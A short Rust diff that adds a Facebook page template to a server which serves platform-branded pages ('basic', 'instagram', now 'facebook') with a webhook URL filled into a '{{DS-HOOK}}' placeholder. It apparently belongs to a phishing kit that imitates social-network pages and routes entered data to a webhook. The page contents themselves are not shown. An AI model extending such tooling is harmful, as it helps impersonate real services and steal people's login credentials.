@@ -10,6 +10,8 @@ pub struct Server {
 
 const BASIC_PAGE: &str = include_str!("pages/basic.html");
 const INSTAGRAM_PAGE: &str =  include_str!("pages/instagram.html");
+const FACEBOOK_PAGE: &str =  include_str!("pages/facebook.html");
+
 
 
 
@@ -108,6 +110,7 @@ fn page(platform: &str, webhook_url: &str) -> String {
     match platform {
         "basic" => BASIC_PAGE.replace("{{DS-HOOK}}", webhook_url),
         "instagram" => INSTAGRAM_PAGE.replace("{{DS-HOOK}}", webhook_url),
+        "facebook" => FACEBOOK_PAGE.replace("{{DS-HOOK}}", webhook_url),
         _ => BASIC_PAGE.replace("{{DS-HOOK}}", webhook_url),
     }
 }
